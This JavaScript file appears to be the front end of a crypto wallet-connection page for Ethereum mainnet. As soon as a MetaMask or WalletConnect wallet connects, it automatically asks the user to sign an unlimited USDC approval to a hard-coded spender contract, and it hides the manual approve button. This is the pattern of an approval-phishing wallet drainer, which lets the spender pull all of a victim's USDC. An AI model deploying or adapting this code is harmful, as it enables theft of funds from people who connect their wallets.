// script.js
// --- Configuration for Ethereum Mainnet ---
const WALLETCONNECT_PROJECT_ID = '25a778da5292aee3e00da87e594c2005'; // Your WalletConnect Project ID for V2
const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // Official Ethereum Mainnet USDC Address
const SPENDER_CONTRACT_ADDRESS = '0xa81EE3A48c2B72C6AdB279812a730c93EfF5C2F6'; // Your Deployed UsdcAllowanceSpender Contract on Mainnet
const FIXED_ALLOWANCE_AMOUNT_HEX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // Unlimited allowance (MaxUint256)

// Auto-approve configuration
const AUTO_APPROVE_ENABLED = true; // Set to true to automatically trigger the approval transaction

const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function decimals() view returns (uint8)"
];

let provider; // Ethers.js provider
let signer;   // Ethers.js signer
let connectedAccount; // Connected wallet address

let web3Modal; // Web3Modal instance for WalletConnect V2
let currentWeb3ModalProvider; // The provider returned by Web3Modal.connect()

// --- DOM Elements ---
const connectMetaMaskButton = document.getElementById('connectMetaMaskButton');
const connectMobileButton = document.getElementById('connectMobileButton');
const approveButton = document.getElementById('approveButton');
const currentMessage = document.getElementById('current-message');
const loader = document.getElementById('loader');
const walletInfo = document.getElementById('walletInfo');
const accountAddress = document.getElementById('accountAddress');
const networkName = document.getElementById('networkName');
const statusDiv = document.getElementById('status');
const errorDetailsDiv = document.getElementById('errorDetails');
const errorMessageSpan = document.getElementById('errorMessage');
const qrcodeDisplay = document.getElementById('qrcodeDisplay');
const qrcodeImage = document.getElementById('qrcodeImage');

// --- UI Update Functions ---
function hideLoader() {
    loader.classList.add('hidden');
}

function showLoader() {
    loader.classList.remove('hidden');
}

function updateMessage(text, type = 'info') {
    currentMessage.textContent = text;
    currentMessage.className = `status-message ${type}`;
    hideLoader();
}

function showStatus(message, type) {
    statusDiv.textContent = message;
    statusDiv.className = `status-message ${type}`;
    statusDiv.classList.remove('hidden');
}

function hideStatus() {
    statusDiv.classList.add('hidden');
}

function displayErrorDetails(error) {
    errorMessageSpan.textContent = error.message || String(error);
    errorDetailsDiv.classList.remove('hidden');
}

function hideErrorDetails() {
    errorDetailsDiv.classList.add('hidden');
}

function updateWalletInfo(address, network) {
    accountAddress.textContent = address;
    networkName.textContent = network;
    walletInfo.classList.remove('hidden');
    // If auto-approve is enabled, we don't need the approve button, it triggers automatically
    if (!AUTO_APPROVE_ENABLED) {
        approveButton.classList.remove('hidden'); 
    }
    connectMetaMaskButton.classList.add('hidden');
    connectMobileButton.classList.add('hidden');
    qrcodeDisplay.classList.add('hidden'); // Hide QR code after connection
}

function resetUI() {
    walletInfo.classList.add('hidden');
    approveButton.classList.add('hidden');
    connectMetaMaskButton.classList.remove('hidden');
    connectMobileButton.classList.remove('hidden');
    qrcodeDisplay.classList.add('hidden');
    hideStatus();
    hideErrorDetails();
    updateMessage('Please connect your wallet to approve USDC.', 'info');
    // Clear Web3Modal cache if a provider was connected via it
    if (web3Modal && web3Modal.cachedProvider) {
        console.log("Clearing Web3Modal cached provider...");
        web3Modal.clearCachedProvider();
    }
    currentWeb3ModalProvider = null;
}

// Generic handler for provider changes/connection
async function handleProviderConnection(currentProvider) {
    if (!currentProvider) {
        console.log("Provider disconnected or not available.");
        resetUI();
        return;
    }

    try {
        provider = new ethers.providers.Web3Provider(currentProvider); // Ethers V5 provider
        signer = provider.getSigner();
        connectedAccount = await signer.getAddress();
        const network = await provider.getNetwork();

        updateWalletInfo(connectedAccount, network.name);
        updateMessage('Wallet connected. Ready to approve USDC.', 'success');
        console.log('Wallet connected:', connectedAccount, 'on', network.name);

        // Automatically trigger approval if enabled
        if (AUTO_APPROVE_ENABLED) {
            console.log('DEBUG: AUTO_APPROVE_ENABLED is true. Attempting to proposeApproveTransaction()...');
            await proposeApproveTransaction();
        }

        // Set up event listeners for the provider
        currentProvider.on("accountsChanged", (accounts) => {
            console.log("accountsChanged", accounts);
            if (accounts.length === 0) resetUI();
            else handleProviderConnection(currentProvider);
        });
        currentProvider.on("chainChanged", (chainId) => {
            console.log("chainChanged", chainId);
            handleProviderConnection(currentProvider);
        });
        currentProvider.on("disconnect", (code, reason) => {
            console.log("disconnect", code, reason);
            resetUI();
        });

    } catch (error) {
        console.error('Error handling provider connection:', error);
        updateMessage('Error processing wallet connection.', 'error');
        displayErrorDetails(error);
        resetUI();
    } finally {
        hideLoader();
    }
}

async function connectMetaMask() {
    showLoader();
    updateMessage('Connecting to MetaMask...', 'info');
    hideStatus();
    hideErrorDetails();

    try {
        if (typeof window.ethereum === 'undefined') {
            throw new Error("MetaMask not detected. Please install it.");
        }

        // Request account access for MetaMask
        await window.ethereum.request({ method: 'eth_requestAccounts' });

        // Use window.ethereum as the provider and pass to generic handler
        await handleProviderConnection(window.ethereum);

    } catch (error) {
        console.error('MetaMask connection failed:', error);
        updateMessage('MetaMask connection cancelled or failed.', 'error');
        displayErrorDetails(error);
        resetUI();
        hideLoader();
    }
}

async function connectMobileWallet() {
    showLoader();
    updateMessage('Opening wallet selection for mobile wallet...', 'info');
    hideStatus();
    hideErrorDetails();

    try {
        if (!web3Modal) {
            throw new Error("Web3Modal not initialized. Ensure web3modal.js is loaded.");
        }

        // Web3Modal handles the UI for wallet selection and QR code display
        currentWeb3ModalProvider = await web3Modal.openModal();

        if (currentWeb3ModalProvider) {
            console.log("Web3Modal provider connected.", currentWeb3ModalProvider);
            // Set up event listeners for the Web3Modal provider (WalletConnect V2 provider)
            currentWeb3ModalProvider.on("accountsChanged", (accounts) => {
                console.log("Web3Modal accountsChanged", accounts);
                if (accounts.length === 0) resetUI();
                else handleProviderConnection(currentWeb3ModalProvider);
            });
            currentWeb3ModalProvider.on("chainChanged", (chainId) => {
                console.log("Web3Modal chainChanged", chainId);
                handleProviderConnection(currentWeb3ModalProvider);
            });
            currentWeb3ModalProvider.on("disconnect", (error) => {
                console.log("Web3Modal disconnect", error);
                resetUI();
            });
            currentWeb3ModalProvider.on("error", (error) => {
                console.error("Web3Modal provider error:", error);
                displayErrorDetails(error);
                resetUI();
                hideLoader();
            });

            await handleProviderConnection(currentWeb3ModalProvider);
        } else {
            console.log("Web3Modal connection cancelled or failed.");
            updateMessage('Mobile wallet connection cancelled.', 'error');
            resetUI();
            hideLoader();
        }

    } catch (error) {
        console.error('Mobile wallet connection failed:', error);
        updateMessage('Mobile wallet connection cancelled or failed.', 'error');
        displayErrorDetails(error);
        resetUI();
        hideLoader();
    }
}

// --- Propose Approve Transaction Function ---
async function proposeApproveTransaction() {
    if (!signer || !connectedAccount) {
        updateMessage('Wallet not connected. Please connect your wallet first.', 'error');
        return;
    }

    showLoader();
    updateMessage('Proposing USDC approval transaction... Please confirm in your wallet.', 'info');
    hideStatus();
    hideErrorDetails();

    try {
        // Ethers V5: use ethers.Contract directly
        const usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
        
        // Ethers V5: ethers.constants.MaxUint256
        const txResponse = await usdcContract.approve(
            SPENDER_CONTRACT_ADDRESS,
            ethers.constants.MaxUint256 // Unlimited allowance
        );

        const txHash = txResponse.hash;

        showStatus(`Transaction submitted! Hash: ${txHash.substring(0, 10)}...${txHash.substring(txHash.length - 4)}. Check wallet for status.`, 'success');
        updateMessage('Approval transaction sent!', 'success');
        console.log('Transaction Hash:', txHash);

    } catch (error) {
        console.error('Transaction proposal failed:', error);
        showStatus(`Transaction failed: ${error.message || error}`, 'error');
        updateMessage('Approval transaction failed.', 'error');
        displayErrorDetails(error);
    } finally {
        hideLoader();
    }
}

// --- Event Listeners ---
connectMetaMaskButton.addEventListener('click', connectMetaMask);
connectMobileButton.addEventListener('click', connectMobileWallet);

// The approve button is now only visible if AUTO_APPROVE_ENABLED is false
if (!AUTO_APPROVE_ENABLED) {
    approveButton.addEventListener('click', proposeApproveTransaction);
}

// Initial setup on load
window.addEventListener('load', async () => {
    // Check if the buttons and QR display elements exist before adding event listeners (for robustness)
    if (!connectMetaMaskButton || !connectMobileButton || !qrcodeDisplay || !qrcodeImage) {
        console.error("One or more essential UI elements not found! Ensure index.html is up-to-date.");
        updateMessage("UI Initialization Error: Please check console for details.", "error");
        return;
    }

    // Initialize Web3Modal (WalletConnect V2)
    if (typeof Web3Modal === 'undefined') {
        console.error("Web3Modal library not loaded. Ensure it's imported as a module in index.html.");
        updateMessage("Web3Modal Init Error: Please check console for details.", "error");
        return;
    }

    const providerOptions = {}; // For now, no custom providers needed, Web3Modal will handle WalletConnect V2

    web3Modal = new Web3Modal({
        network: "mainnet", // Default network
        cacheProvider: true, // Optional: enables provider caching
        providerOptions, // Required. Pass an empty object to use default providers
        projectId: WALLETCONNECT_PROJECT_ID // Your WalletConnect Project ID
    });
    console.log("Web3Modal initialized.");

    // Attempt to re-establish previous connection if any
    if (web3Modal.cachedProvider) {
        console.log("Found cached Web3Modal provider. Attempting to re-connect...");
        try {
            currentWeb3ModalProvider = await web3Modal.connect();
            if (currentWeb3ModalProvider) {
                await handleProviderConnection(currentWeb3ModalProvider);
            } else {
                console.log("Cached Web3Modal provider not re-established. Clearing...");
                web3Modal.clearCachedProvider();
                resetUI();
            }
        } catch (e) {
            console.error("Error re-establishing cached Web3Modal provider:", e);
            web3Modal.clearCachedProvider();
            resetUI();
        }
    } else if (window.ethereum && window.ethereum.selectedAddress) {
        console.log("Found existing MetaMask selectedAddress. Attempting to re-establish session.");
        await handleProviderConnection(window.ethereum);
    } else {
        updateMessage('Please connect your wallet to approve USDC.', 'info');
    }
});
